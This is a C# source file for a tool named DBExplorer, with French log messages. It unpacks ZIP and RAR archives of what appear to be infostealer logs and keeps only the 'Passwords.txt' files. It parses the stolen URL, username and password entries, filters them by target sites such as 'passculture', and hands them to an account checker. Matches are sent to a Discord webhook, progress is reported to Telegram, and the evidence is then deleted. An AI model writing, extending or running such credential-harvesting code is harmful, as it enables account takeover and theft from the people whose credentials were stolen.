﻿using System.Text.RegularExpressions;
using Ionic.Zip;
using SharpCompress.Archives;
using SharpCompress.Archives.Zip;
using SharpCompress.Archives.Rar;
using SharpCompress.Common;
using ColorfulConsole = Colorful.Console;

namespace DBExplorer
{
    public static class DBExplorer
    {
        private static DateTime startTime;

        public static void Run(string localFilePath)
        {
            DataVortex.Checker.RemoveDuplicateLines("verified_accounts.json");
            PrintBanner();
            string[] archives = new string[] { localFilePath };

            foreach (string archivePath in archives)
            {
                string archiveName = Path.GetFileName(archivePath);
                Console.ForegroundColor = ConsoleColor.Red;
                Console.ResetColor();

                startTime = DateTime.Now;

                string directoryPath = @"dbdtemp";

                if (!Directory.Exists(directoryPath))
                {
                    Directory.CreateDirectory(directoryPath);
                    Telegram.LogMessage("Création de dbdtemp.");
                }

                if (RarArchive.IsRarFile(archivePath))
                {
                    Telegram.LogMessage("Extration de l'archive RAR en cours");
                }
                else
                    Telegram.LogMessage("Extration de l'archive ZIP en cours");

                try
                {
                    ExtractArchive(archivePath, "dbdtemp");
                }
                catch (FormatException ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Telegram.LogMessage($"Erreur lors de l'extraction de l'archive {archiveName}: {ex.Message}");
                    Console.ResetColor();
                }
                catch (InvalidFormatException ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Telegram.LogMessage($"Erreur lors de l'extraction de l'archive {archiveName}: {ex.Message}");
                    Console.ResetColor();
                }
                catch (System.OverflowException ex)
                {
                    Telegram.LogMessage("Une exception de dépassement de capacité s'est produite : " + ex.Message);
                }
                catch (SharpCompress.Common.CryptographicException ex)
                {
                    Telegram.LogMessage("Problème concernant l'archive : " + ex.Message);
                }
                catch (System.IndexOutOfRangeException ex)
                {
                    Telegram.LogMessage("Problème concernant l'archive : " + ex.Message);
                }
                catch (System.InvalidOperationException ex)
                {
                    Telegram.LogMessage("Problème concernant l'archive : " + ex.Message);
                }


                var results = FindPasswords();

                foreach (var keyword in DataVortex.keywords.UrlChecker.Keywords.List.Keys)
                {
                    if (results.ContainsKey(keyword) && results[keyword].Count > 0)
                    {
                        if (keyword == "passculture")
                        {
                            DataVortex.keywords.UrlChecker.Keywords.SendToDiscordWebhookPassculture(
                                results[keyword],
                                DataVortex.keywords.UrlChecker.Keywords.List[keyword],
                                archiveName,
                                DataVortex.Checker.BirthDate,
                                DataVortex.Checker.Remaining1
                            ).Wait();
                        }
                    }
                }

                Console.ForegroundColor = ConsoleColor.Red;
                Telegram.LogMessage($"Fin de l'archive {archiveName}, suppression en cours...");
                File.Delete(localFilePath);
                Console.ResetColor();
                while (File.Exists(localFilePath))
                {
                    Thread.Sleep(100);
                }
            }

            if (Directory.Exists("dbdtemp"))
            {
                DirectoryInfo directory = new DirectoryInfo("dbdtemp");
                foreach (FileInfo file in directory.GetFiles())
                {
                    file.Delete();
                }
                foreach (DirectoryInfo subDirectory in directory.GetDirectories())
                {
                    subDirectory.Delete(true);
                }

                Console.ForegroundColor = ConsoleColor.Red;
                Telegram.LogMessage("Contenu de dbdtemp supprimé avec succès.");
                Console.ResetColor();
                Telegram.LogMessage("Effacement de l'action sur archive d'ici 5 secondes.");
                Thread.Sleep(5000);
                Startconsole();
            }
        }

        public static void Startconsole()
        {
            Telegram.ClearConsole();
            PrintBanner();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine();
            Telegram.LogMessage("Prêt à télécharger la prochaine archive");
        }

        private static void PrintBanner()
        {
            ColorfulConsole.WriteLine(Figgle.FiggleFonts.Standard.Render("DBExplorer"));
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("V1.8.3");
            Console.ResetColor();
        }

        private static void ExtractArchive(string filename, string output_path)
        {
            if (IsArchiveFile(filename))
            {
                using (var archive = ArchiveFactory.Open(filename))
                {
                    foreach (var entry in archive.Entries)
                    {
                        if (!entry.IsDirectory && (entry.Key.EndsWith("Passwords.txt") || entry.Key.EndsWith("All Passwords.txt")))
                        {
                            string relativePath = entry.Key;
                            string outputPath = Path.GetFullPath(Path.Combine(output_path, relativePath));
                            string outputDirPath = Path.GetDirectoryName(outputPath) ?? Path.Combine(output_path, "default");

                            Directory.CreateDirectory(outputDirPath);
                            entry.WriteToFile(outputPath, new ExtractionOptions { ExtractFullPath = true, Overwrite = true });
                        }
                    }
                }
            }
            else
            {
                ColorfulConsole.WriteLine("Erreur : format d'archive non pris en charge", System.Drawing.Color.Blue);
                Console.ResetColor();
                File.Delete(filename);
            }
        }
        private static bool IsArchiveFile(string filename)
        {
            return ZipFile.IsZipFile(filename) || RarArchive.IsRarFile(filename);
        }

        public static Dictionary<string, List<(string urlOrHost, string username, string password, string app)>> FindPasswords()
        {
            var results = new Dictionary<string, List<(string urlOrHost, string username, string password, string app)>>();
            var directoryPath = "dbdtemp";
            var files = Directory.GetFiles(directoryPath, "Passwords.txt", SearchOption.AllDirectories);
            files = files.Concat(Directory.GetFiles(directoryPath, "All Passwords.txt", SearchOption.AllDirectories)).ToArray();

            foreach (var file in files)
            {
                var contents = File.ReadAllText(file);
                var matches = Regex.Matches(contents, @"(?:URL|HOST):\s*(.*?)\n(?:Username|Login|User):\s*(.*?)\n(?:Password|Pass):\s*(.*?)\n=*");

                foreach (Match match in matches)
                {
                    var urlOrHost = match.Groups[1].Value.Trim();
                    var username = match.Groups[2].Value.Trim();
                    var password = match.Groups[3].Value.Trim();
                    var app = "DBExplorer";

                    foreach (var keyword in DataVortex.keywords.UrlChecker.Keywords.List.Keys)
                    {
                        if (urlOrHost.Contains(keyword))
                        {
                            var result = (urlOrHost, username, password, app);

                            DataVortex.Checker.HandleAccount(keyword, result);

                            if (!results.ContainsKey(keyword))
                            {
                                results[keyword] = new List<(string urlOrHost, string username, string password, string app)>();
                            }
                            results[keyword].Add(result);
                        }
                    }
                }
            }

            return results;
        }
    }
}